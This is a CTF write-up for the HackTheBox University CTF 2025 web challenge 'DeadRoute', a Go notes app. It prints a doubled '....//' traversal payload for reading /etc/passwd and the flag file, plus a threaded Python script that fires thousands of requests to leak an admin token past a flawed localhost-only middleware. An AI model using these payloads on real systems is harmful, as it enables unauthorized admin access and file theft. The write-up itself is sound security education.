---
layout: post
title: "HackTheBox University CTF 2025 - DeadRoute Writeup"
permalink: /writeups/ctf/HTB-University-CTF-2025/deadroute
categories: [ctf, htb, web, easy]
---

**Date:** 22/12/2025\
**Author:** [acfirthh](https://github.com/acfirthh)

**Challenge Name:** DeadRoute\
**Difficulty:** Easy

## Challenge Summary
This challenge consisted of a custom web application with the backend written in **Golang**. The webapp was pretty basic, consisting of an index page with a list of *"sticky notes"* with peoples wishes and to-do lists on them. There was also an admin panel which allowed for writing and deleting notes.\
The aim of the challenge, was to get the flag by reading it from the local file system by exploiting an arbitrary file read vulnerability after gaining access to the admin panel by exploiting a race condition in the way middleware was handled.

## First look and Source Code Analysis
![Index Page](/assets/images/writeups/htb-university-ctf-2025/deadroute/index_page.png)
Upon visiting the target IP, I saw a page full of *"sticky notes"* and a button in the top right for the admin login page. Clicking the button, I saw that the login page required a passkey.

![Login Page](/assets/images/writeups/htb-university-ctf-2025/deadroute/login_page.png)
The admin passkey was generated uniquely on every restart of the challenge:
```bash
# Generate random ADMIN_PASSWORD (32 characters)
ADMIN_PASSWORD=$(openssl rand -hex 16)
```

Going back to the index page, when clicking on a note, it opens up into a larger *modal* type view to read all of the note contents. It also makes a request to `/notes/read?id=<note_name>` to fetch the note contents.

![Public Read Note Request](/assets/images/writeups/htb-university-ctf-2025/deadroute/read_note_public.png)

I also noticed within the challenge source code, there was a directory named **notes** which contained files named like **some_name_note**, which matched what I saw in the request, making me immediately assume there was an arbitrary file read vulnerability. However, viewing the source code for the `PublicReadNote()` function, the developer had implemented *anti directory-traversal* filtering which ignores the request if the **id** value contains **..**.

![PublicReadNote Function](/assets/images/writeups/htb-university-ctf-2025/deadroute/public_read_note_func.png)
But, there was also another function used for reading notes, this time it was only run by the admin user when reading a note from the admin page.

![ReadNote Function](/assets/images/writeups/htb-university-ctf-2025/deadroute/admin_read_note_func.png)
This time, if the request includes **".."** it is not ignored, in fact it does not even check for the typical directory traversal pattern. Instead, it just runs a **replace** operation on the value of the **id** parameter, replacing **../** with nothing, in a rudamentary attempt to prevent directory traversal and arbitrary file read. Unfortunately for the developer, this is easily bypassed by *doubling up* on the **../** patterns.

```text
Original Payload: ../../../../etc/passwd
After Replace: etc/passwd

Bypass Payload: ....//....//....//....//etc/passwd
Replacing: ..[../]/..[../]/..[../]/..[../]/etc/passwd
                ^       ^       ^       ^
                     Replace with ""

After Replace: ../../../../etc/passwd
```

So, now I had a way to get arbitrary file read and get the flag, however to exploit this I needed to be logged in as admin.

### Middleware Bypass Vulnerability
![Admin Routes](/assets/images/writeups/htb-university-ctf-2025/deadroute/admin_login_token_route.png)

Looking at the registered routes, I noticed an admin route `/admin/login-token`. This one was not behind the standard admin middleware but instead a `LocalHostOnly` middleware.

```go
func (c *AdminController) LoginToken(w http.ResponseWriter, r *http.Request) {
	token := models.GenerateAuthToken()
	w.Header().Set("Content-Type", "text/plain")
	w.Write([]byte(token))
}
```
The `/admin/login-token` route, when visited returns a valid admin session token in plaintext.

```go
func LocalHostOnly(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Extract IP from RemoteAddr (format: "IP:port")
		host, _, err := net.SplitHostPort(r.RemoteAddr)
		if err != nil {
			// If SplitHostPort fails, try using RemoteAddr directly
			host = r.RemoteAddr
		}

		// Check if request is from localhost
		// Handle both IPv4 (127.0.0.1) and IPv6 (::1) cases
		if host != "127.0.0.1" && host != "::1" && host != "localhost" {
			http.Error(w, "Forbidden", http.StatusForbidden)
			return
		}
		next.ServeHTTP(w, r)
	})
}
```
The `LocalHostOnly` middleware uses `RemoteAddr` to extract the host IP address. It checks if it is **127.0.0.1**, **::1**, or **localhost**, if it is not then it returns a *Forbidden* message. I initially assumed that I may be able to bypass this by adding custom headers like **X-Forwarded-For** or **X-Real-IP** as if the webapp was behind a reverse proxy such as **NGINX**. However, research into `RemoteAddr` showed me that it never uses request headers to get the client IP address.

After some more reading through the source code, I found a `getMWFromHandler()` function in the `router.go` file. 

```go
func getMWFromHandler(h Handler) Middleware {
	if mw, ok := h.(func(http.Handler) http.Handler); ok {
		return mw
	}
	return func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			h.(http.Handler).ServeHTTP(w, r)
			next.ServeHTTP(w, r)
		})
	}
}
```
This function works differently to conventional **Go** middleware calls. In this scenario, it calls the original handler first *(the function corresponding to the requested route)* and then the **next handler** which in this case is the **LocalHostOnly** middleware.

This means, technically, the response from the requested route gets returned before the middleware *kicks in*. However, through general interaction with the web application this is difficult to exploit.

## Exploit
To exploit this, I wrote a super quick **Python** script using threading to make thousands of requests in parallel and use regex to attempt to extract the session token from the response.

```python
from threading import Thread
from requests import get
import re

def make_request(route):
    resp = get(f"http://target:port{route}",
               headers={"Connection": "close"},
               timeout=2)
    
    matches = re.findall(r'[a-zA-Z0-9]{20,}', resp.text)
    if matches:
        print(matches)

threads = []
for i in range(10000):
    threads.append(Thread(target=make_request, args=("/",)))
    threads.append(Thread(target=make_request, args=("/admin/login-token",)))
    
for t in threads:
    t.start()

for t in threads:
    t.join()
```

Within about 5 seconds of running the script, I got a string of characters. I opened the developer options in the browser, added a new token named **santa_auth** and pasted the string of characters. I then attempted to visit `/admin` and it accepted the session token and gave me access to the admin panel.

I made one more request to `/admin/notes/read?id=....//....//....//....//flag.txt` to exploit the arbitrary file read I had previously discovered and got the flag.

![Arbitrary File Read](/assets/images/writeups/htb-university-ctf-2025/deadroute/file_read_flag.png)